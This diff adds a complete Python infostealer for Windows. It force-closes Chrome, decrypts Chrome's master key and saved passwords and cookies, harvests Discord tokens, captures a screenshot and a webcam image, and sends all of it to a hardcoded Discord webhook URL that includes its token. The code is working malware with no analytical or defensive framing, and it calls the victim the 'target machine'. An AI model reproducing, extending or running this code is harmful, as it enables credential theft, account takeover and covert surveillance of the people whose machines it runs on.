@@ -1,0 +1,557 @@
+import os
+import json
+import base64
+import sqlite3
+import win32crypt
+from Crypto.Cipher import AES
+import shutil
+from datetime import datetime, timedelta
+import requests
+import tempfile
+import uuid
+import subprocess
+import time
+import ctypes
+import sys
+import re
+import cv2
+
+def get_encryption_key():
+    """Get Chrome encryption key from Local State file"""
+    if os.name == 'nt':
+        local_state_path = os.path.join(os.environ['LOCALAPPDATA'], 
+                                    'Google\\Chrome\\User Data\\Local State')
+    try:
+        with open(local_state_path, 'r', encoding='utf-8') as f:
+            local_state = json.loads(f.read())
+            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            encrypted_key = encrypted_key[5:]
+            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        
+        return decrypted_key
+    except Exception as e:
+        print(f"Error getting encryption key: {e}")
+        return None
+
+def close_chrome():
+    """Close Chrome process if running"""
+    try:
+        if os.name == 'nt':
+            subprocess.call("taskkill /f /im chrome.exe", shell=True)
+            time.sleep(2)
+        return True
+    except Exception as e:
+        print(f"Error closing Chrome: {e}")
+        return False
+
+def take_screenshot_win32():
+    """Take screenshot using Win32 API instead of PyAutoGUI"""
+    try:
+        import win32gui
+        import win32ui
+        import win32con
+        from ctypes import windll
+        from PIL import Image
+        
+        hwin = win32gui.GetDesktopWindow()
+        width = windll.user32.GetSystemMetrics(0)
+        height = windll.user32.GetSystemMetrics(1)
+        hwindc = win32gui.GetWindowDC(hwin)
+        srcdc = win32ui.CreateDCFromHandle(hwindc)
+        memdc = srcdc.CreateCompatibleDC()
+        screenshot = win32ui.CreateBitmap()
+        screenshot.CreateCompatibleBitmap(srcdc, width, height)
+        memdc.SelectObject(screenshot)
+        memdc.BitBlt((0, 0), (width, height), srcdc, (0, 0), win32con.SRCCOPY)
+        temp_dir = tempfile.gettempdir()
+        screenshot_path = os.path.join(temp_dir, f"screenshot_{uuid.uuid4().hex}.bmp")
+
+        try:
+            bmpinfo = screenshot.GetInfo()
+            bmpstr = screenshot.GetBitmapBits(True)
+            img = Image.frombuffer(
+                'RGB',
+                (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
+                bmpstr, 'raw', 'BGRX', 0, 1)
+            
+            screenshot_path = os.path.join(temp_dir, f"screenshot_{uuid.uuid4().hex}.png")
+            img.save(screenshot_path)
+        except ImportError:
+            screenshot.SaveBitmapFile(memdc, screenshot_path)
+        
+        memdc.DeleteDC()
+        win32gui.ReleaseDC(hwin, hwindc)
+        
+        return screenshot_path
+    except Exception as e:
+        print(f"Error taking screenshot with Win32: {e}")
+        try:
+            from PIL import ImageGrab
+            
+            temp_dir = tempfile.gettempdir()
+            screenshot_path = os.path.join(temp_dir, f"screenshot_{uuid.uuid4().hex}.png")
+            
+            img = ImageGrab.grab()
+            img.save(screenshot_path)
+            
+            return screenshot_path
+        except Exception as e2:
+            print(f"Fallback screenshot method failed: {e2}")
+            return None
+
+def capture_webcam():
+    """Capture an image from the webcam"""
+    try:
+        cap = cv2.VideoCapture(0)
+        
+        if not cap.isOpened():
+            print("Unable to open webcam")
+            return None
+        time.sleep(1)
+        ret, frame = cap.read()
+        
+        if not ret:
+            print("Failed to capture image")
+            cap.release()
+            return None
+            
+        temp_dir = tempfile.gettempdir()
+        webcam_path = os.path.join(temp_dir, f"webcam_{uuid.uuid4().hex}.jpg")
+        cv2.imwrite(webcam_path, frame)
+        
+        cap.release()
+        
+        return webcam_path
+    except Exception as e:
+        print(f"Error capturing webcam: {e}")
+        return None
+
+def get_chrome_cookies():
+    """Extract cookies from Chrome's cookies database"""
+    if os.name == 'nt':
+        chrome_paths = [
+            os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Default\\Network\\Cookies'),
+            os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Default\\Cookies')
+        ]
+    chrome_path = None
+    for path in chrome_paths:
+        if os.path.exists(path):
+            chrome_path = path
+            break
+    
+    if not chrome_path:
+        print("Could not find Chrome cookies database")
+        return []
+    
+    temp_dir = tempfile.gettempdir()
+    temp_path = os.path.join(temp_dir, f'cookies_temp_{uuid.uuid4().hex}.db')
+    
+    try:
+        shutil.copy2(chrome_path, temp_path)
+    except Exception as e:
+        print(f"Error copying cookie database: {e}")
+        return []
+    
+    time.sleep(1)
+    
+    try:
+        decryption_key = get_encryption_key()
+        if not decryption_key:
+            print("Failed to get decryption key for cookies")
+    except Exception as e:
+        print(f"Error getting encryption key for cookies: {e}")
+        decryption_key = None
+    
+    cookies = []
+    try:
+        conn = sqlite3.connect(temp_path)
+        cursor = conn.cursor()
+
+        query_executed = False
+        for query in [
+            'SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies',
+            'SELECT host_key, name, value, path, expires_utc, is_secure FROM cookies'
+        ]:
+            try:
+                cursor.execute(query)
+                query_executed = True
+                break
+            except sqlite3.OperationalError:
+                continue
+        
+        if not query_executed:
+            conn.close()
+            try:
+                os.remove(temp_path)
+            except:
+                pass
+            return []
+        
+        for row in cursor.fetchall():
+            if len(row) >= 6:
+                host_key, name, encrypted_value, path, expires_utc, is_secure = row
+                
+                if expires_utc:
+                    chrome_epoch_start = datetime(1601, 1, 1)
+                    expires = chrome_epoch_start + timedelta(microseconds=expires_utc)
+                else:
+                    expires = None
+                
+                value = ""
+                if isinstance(encrypted_value, bytes):
+                    try:
+                        value = encrypted_value.decode('utf-8')
+                    except UnicodeDecodeError:
+                        if decryption_key:
+                            try:
+                                if encrypted_value[:3] == b'v10':
+                                    iv = encrypted_value[3:15]
+                                    encrypted_data = encrypted_value[15:-16]
+                                    tag = encrypted_value[-16:]
+                                    cipher = AES.new(decryption_key, AES.MODE_GCM, iv)
+                                    value = cipher.decrypt_and_verify(encrypted_data, tag).decode('utf-8', errors='replace')
+                                else:
+                                    try:
+                                        value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='replace')
+                                    except Exception as e:
+                                        value = "[Encrypted: " + encrypted_value.hex()[:24] + "...]"
+                            except Exception as e:
+                                value = "[Decryption failed]"
+                        else:
+                            value = "[Encrypted: " + encrypted_value.hex()[:24] + "...]"
+                else:
+                    value = encrypted_value
+                
+                cookie = {
+                    'domain': host_key,
+                    'name': name,
+                    'value': value,
+                    'path': path,
+                    'expires': expires.isoformat() if expires else None,
+                    'secure': bool(is_secure)
+                }
+                cookies.append(cookie)
+        
+        conn.close()
+    except Exception as e:
+        print(f"Error extracting cookies: {e}")
+    
+    try:
+        os.remove(temp_path)
+    except:
+        pass
+    
+    return cookies
+
+def get_chrome_passwords():
+    """Extract passwords from Chrome's password database"""
+    
+    if os.name == 'nt':
+        chrome_paths = [
+            os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Default\\Login Data'),
+            os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Default\\Web Data')
+        ]
+    chrome_path = None
+    for path in chrome_paths:
+        if os.path.exists(path):
+            chrome_path = path
+            break
+    
+    if not chrome_path:
+        print("Could not find Chrome password database")
+        return []
+    
+    temp_dir = tempfile.gettempdir()
+    temp_path = os.path.join(temp_dir, f'login_data_temp_{uuid.uuid4().hex}.db')
+    
+    try:
+        shutil.copy2(chrome_path, temp_path)
+    except Exception as e:
+        print(f"Error copying password database: {e}")
+        return []
+    
+    time.sleep(1)
+    
+    try:
+        decryption_key = get_encryption_key()
+        if not decryption_key:
+            print("Failed to get decryption key for passwords")
+    except Exception as e:
+        print(f"Error getting encryption key for passwords: {e}")
+        decryption_key = None
+    
+    passwords = []
+    try:
+        conn = sqlite3.connect(temp_path)
+        cursor = conn.cursor()
+        
+        query_executed = False
+        for query in [
+            'SELECT origin_url, username_value, password_value FROM logins',
+            'SELECT signon_realm, username_value, password_value FROM logins',
+            'SELECT origin_url, username_element, password_value FROM logins'
+        ]:
+            try:
+                cursor.execute(query)
+                query_executed = True
+                break
+            except sqlite3.OperationalError:
+                continue
+        
+        if not query_executed:
+            conn.close()
+            try:
+                os.remove(temp_path)
+            except:
+                pass
+            return []
+        
+        for row in cursor.fetchall():
+            if len(row) >= 3:
+                url, username, encrypted_password = row
+                
+                if not url or not username or not encrypted_password:
+                    continue
+                
+                hex_password = encrypted_password.hex() if isinstance(encrypted_password, bytes) else str(encrypted_password)
+                decrypted_password = f"[Raw: {hex_password[:24]}...]"
+                
+                if decryption_key and isinstance(encrypted_password, bytes):
+                    try:
+                        if len(encrypted_password) > 3 and encrypted_password[:3] == b'v10':
+                            iv = encrypted_password[3:15]
+                            encrypted_data = encrypted_password[15:-16]
+                            auth_tag = encrypted_password[-16:] 
+                            
+                            cipher = AES.new(decryption_key, AES.MODE_GCM, iv)
+                            decrypted_data = cipher.decrypt_and_verify(encrypted_data, auth_tag)
+                            
+                            decrypted_password = decrypted_data.decode('utf-8', errors='replace')
+                        
+                        else:
+                            try:
+                                if all(32 <= c < 127 for c in encrypted_password):
+                                    decrypted_password = encrypted_password.decode('utf-8', errors='replace')
+                                else:
+                                    decrypted_data = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
+                                    decrypted_password = decrypted_data.decode('utf-8', errors='replace')
+                            except win32crypt.error as e:
+                                if e.winerror == 87:
+                                    try:
+                                        for i in range(1, 8):
+                                            try:
+                                                decrypted_data = win32crypt.CryptUnprotectData(encrypted_password[i:], None, None, None, 0)[1]
+                                                decrypted_password = decrypted_data.decode('utf-8', errors='replace')
+                                                break
+                                            except:
+                                                continue
+                                    except:
+                                        pass
+                    except Exception as e:
+                        print(f"Decryption error: {e}")
+                
+                passwords.append({
+                    'url': url,
+                    'username': username,
+                    'password': decrypted_password
+                })
+        
+        conn.close()
+    except Exception as e:
+        print(f"Error extracting passwords: {e}")
+    
+    try:
+        os.remove(temp_path)
+    except:
+        pass
+    
+    return passwords
+
+def find_discord_tokens():
+    """Find Discord tokens in Chrome's Local Storage"""
+    
+    tokens = []
+    
+    try:
+        if os.name == 'nt':
+            leveldb_paths = [
+                os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb'),
+                os.path.join(os.environ['APPDATA'], 'Discord\\Local Storage\\leveldb')
+            ]
+        
+        token_regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
+    
+        for leveldb_path in leveldb_paths:
+            if not os.path.exists(leveldb_path):
+                continue
+                
+            for filename in os.listdir(leveldb_path):
+                if not filename.endswith('.log') and not filename.endswith('.ldb'):
+                    continue
+                    
+                file_path = os.path.join(leveldb_path, filename)
+                try:
+                    with open(file_path, 'r', errors='ignore') as file:
+                        content = file.read()
+                        found = token_regex.findall(content)
+                        for token in found:
+                            if token not in tokens:
+                                tokens.append(token)
+                except Exception as e:
+                    print(f"Error reading {filename}: {e}")
+                    
+    except Exception as e:
+        print(f"Error finding Discord tokens: {e}")
+        
+    return tokens
+
+def upload_file_to_discord(webhook_url, file_path, content=None):
+    """Upload a file to Discord using the webhook"""
+    if not file_path or not os.path.exists(file_path):
+        return False
+    
+    try:
+        with open(file_path, 'rb') as f:
+            file_data = f.read()
+        
+        payload = {
+            'content': content if content else 'File upload'
+        }
+        
+        filename = os.path.basename(file_path)
+        files = {
+            'file': (filename, file_data, 'application/octet-stream')
+        }
+        
+        response = requests.post(webhook_url, data=payload, files=files)
+        
+        try:
+            os.remove(file_path)
+        except:
+            pass
+        
+        return response.status_code == 200 or response.status_code == 204
+    except Exception as e:
+        print(f"Error uploading file: {e}")
+        return False
+
+def send_to_discord_webhook(webhook_url, passwords, cookies):
+    """Send the extracted data to a Discord webhook"""
+    
+    discord_tokens = find_discord_tokens()
+    password_data = "Chrome Passwords:\n\n"
+    for entry in passwords[:50]:
+        password_data += f"URL: {entry['url']}\n"
+        password_data += f"Username: {entry['username']}\n"
+        password_data += f"Password: {entry['password']}\n"
+        password_data += "-" * 40 + "\n"
+    
+    cookie_data = "Chrome Cookies:\n\n"
+    for entry in cookies[:50]:
+        cookie_data += f"Domain: {entry['domain']}\n"
+        cookie_data += f"Name: {entry['name']}\n"
+        cookie_data += f"Value: {entry['value']}\n"
+        cookie_data += f"Path: {entry['path']}\n"
+        cookie_data += f"Expires: {entry['expires']}\n"
+        cookie_data += f"Secure: {entry['secure']}\n"
+        cookie_data += "-" * 40 + "\n"
+    
+    token_data = "Discord Tokens:\n\n"
+    if discord_tokens:
+        for token in discord_tokens:
+            token_data += f"Token: {token}\n"
+            token_data += "-" * 40 + "\n"
+    else:
+        token_data += "No Discord tokens found.\n"
+    
+    def send_chunks(data, title):
+        chunks = [data[i:i+1900] for i in range(0, len(data), 1900)]
+        for i, chunk in enumerate(chunks):
+            payload = {
+                "content": f"**{title} (Part {i+1}/{len(chunks)})**",
+                "embeds": [
+                    {
+                        "title": f"{title} Data (Part {i+1})",
+                        "description": f"```{chunk}```",
+                        "color": 5814783
+                    }
+                ]
+            }
+            response = requests.post(webhook_url, json=payload)
+            if response.status_code != 204 and response.status_code != 200:
+                return False
+        return True
+    
+    system_info = f"Chrome Data Extraction - System: {os.name}, User: {os.getlogin()}, Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    system_payload = {
+        "content": "**Chrome Data Extraction**",
+        "embeds": [
+            {
+                "title": "System Information",
+                "description": system_info,
+                "color": 15158332
+            }
+        ]
+    }
+    requests.post(webhook_url, json=system_payload)
+    
+    send_chunks(password_data, "Password")
+    send_chunks(cookie_data, "Cookie")
+    send_chunks(token_data, "Discord Token")
+    
+    screenshot_status = "Not attempted"
+    if os.name == 'nt':
+        screenshot_path = take_screenshot_win32()
+        if screenshot_path:
+            upload_result = upload_file_to_discord(webhook_url, screenshot_path, "**Screenshot from target machine**")
+            screenshot_status = "Success" if upload_result else "Failed to upload"
+        else:
+            screenshot_status = "Failed to capture"
+    
+    webcam_status = "Not attempted"
+    webcam_path = capture_webcam()
+    if webcam_path:
+        upload_result = upload_file_to_discord(webhook_url, webcam_path, "**Webcam capture from target machine**")
+        webcam_status = "Success" if upload_result else "Failed to upload"
+    else:
+        webcam_status = "Failed to capture or no webcam available"
+    
+    completion_payload = {
+        "content": "**Extraction Complete**",
+        "embeds": [
+            {
+                "title": "Summary",
+                "description": f"Extracted {len(passwords)} passwords and {len(cookies)} cookies\n" +
+                              f"Discord Tokens: {len(discord_tokens)}\n" +
+                              f"Screenshot: {screenshot_status}\n" +
+                              f"Webcam capture: {webcam_status}\n",
+                "color": 5763719
+            }
+        ]
+    }
+    requests.post(webhook_url, json=completion_payload)
+
+def main():
+    webhook_url = "https://discord.com/api/webhooks/1364687503550058649/O3-Sht291Fnr4mUXp04wOVx-f7tDgDdYC0KF6v0-DY08GqN6a9TrA9qYTm7KuVRlhYs1"
+    
+    try:
+        chrome_closed = close_chrome()
+        passwords = get_chrome_passwords()
+        cookies = get_chrome_cookies()
+        
+        send_to_discord_webhook(webhook_url, passwords, cookies)
+    except Exception as e:
+        error_payload = {
+            "content": "**Extraction Error**",
+            "embeds": [
+                {
+                    "title": "Error occurred during extraction",
+                    "description": str(e),
+                    "color": 15548997
+                }
+            ]
+        }
+        requests.post(webhook_url, json=error_payload)
+
+if __name__ == "__main__":
+    main()
